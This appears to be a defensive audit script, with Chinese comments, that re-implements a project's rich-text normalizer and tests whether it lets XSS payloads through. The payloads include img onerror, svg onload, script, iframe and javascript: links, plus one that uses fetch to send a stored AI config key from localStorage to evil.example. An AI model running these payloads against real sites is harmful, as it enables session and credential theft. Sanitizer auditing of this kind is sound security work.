// 验证：normalizeRichTextContent 是否移除事件处理器 / script
// 复刻 src/lib/richText.ts 的 normalizeRichTextContent，验证它是否移除事件处理器/script
// 用法: node scripts/audit/xss-proof.mjs
const HTML_TAG_REGEX = /<\/?[a-z][\s\S]*>/i;
const EMPTY_PARAGRAPH_REGEX = /<p>(?:\s|&nbsp;|<br\s*\/?>)*<\/p>/gi;
const RICH_TEXT_ANCHOR_REGEX = /<a\b([^>]*)>/gi;
const CLASS_ATTRIBUTE_REGEX = /\bclass\s*=\s*("([^"]*)"|'([^']*)')/i;
const CLASS_ATTRIBUTE_GLOBAL_REGEX = /\bclass\s*=\s*("([^"]*)"|'([^']*)')/gi;
const TRAILING_LIST_PARAGRAPH_REGEX = /(<\/(?:ul|ol)>)\s*<p>(?:\s|&nbsp;|<br\s*\/?>)*<\/p>\s*$/i;
const LEGACY = new Set(["custom-list", "custom-list-ordered"]);

const escapeHtml = (t) => t.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
const stripLegacy = (c) => c.replace(CLASS_ATTRIBUTE_GLOBAL_REGEX, (_m,q,d,s) => {
  const cls = (d ?? s ?? q ?? "").split(/\s+/).filter(Boolean).filter(x => !LEGACY.has(x));
  return cls.length ? `class="${cls.join(" ")}"` : "";
});
const stripTrailing = (c) => { let n=c; while(TRAILING_LIST_PARAGRAPH_REGEX.test(n)) n=n.replace(TRAILING_LIST_PARAGRAPH_REGEX,"$1"); return n; };
const decorate = (c) => c.replace(RICH_TEXT_ANCHOR_REGEX, (m, attrs) => {
  if (CLASS_ATTRIBUTE_REGEX.test(attrs)) return m.replace(CLASS_ATTRIBUTE_REGEX, (_c,q,d,s) => {
    const cur = d ?? s ?? q ?? ""; const cls = cur.split(/\s+/).filter(Boolean);
    if (!cls.includes("rich-text-link")) cls.push("rich-text-link");
    return `class="${cls.join(" ")}"`;
  });
  return `<a class="rich-text-link"${attrs}>`;
});
const normalize = (content) => {
  if (!content) return "";
  let n = content;
  if (!HTML_TAG_REGEX.test(content)) n = escapeHtml(content).replace(/\r\n|\r|\n/g, "<br />");
  return decorate(stripTrailing(stripLegacy(n))).replace(EMPTY_PARAGRAPH_REGEX, "<p><br /></p>");
};

const payloads = [
  ['img onerror', '<p><img src=x onerror="alert(1)"></p>'],
  ['svg onload',  '<p><svg onload="alert(1)"></svg></p>'],
  ['script tag',  '<p><script>alert(1)</script></p>'],
  ['iframe',      '<p><iframe src="javascript:alert(1)"></iframe></p>'],
  ['a js-href',   '<p><a href="javascript:alert(1)">click</a></p>'],
  ['onmouseover', '<p><span onmouseover="alert(1)">hover</span></p>'],
  ['窃取 key',    '<p><img src=x onerror="fetch(\'https://evil.example/?k=\'+localStorage.getItem(\'ai-config-storage\'))"></p>'],
];

console.log("=== 输入 → normalizeRichTextContent → 输出 ===\n");
let survived = 0;
for (const [name, p] of payloads) {
  const out = normalize(p);
  const live = /on\w+\s*=|javascript:|<script|<iframe|<svg/i.test(out);
  if (live) survived++;
  console.log(`[${live ? "存活 ✗" : "被拦 ✓"}] ${name}`);
  console.log(`   in : ${p}`);
  console.log(`   out: ${out}\n`);
}
console.log(`=== ${survived}/${payloads.length} 个载荷原样存活 ===`);
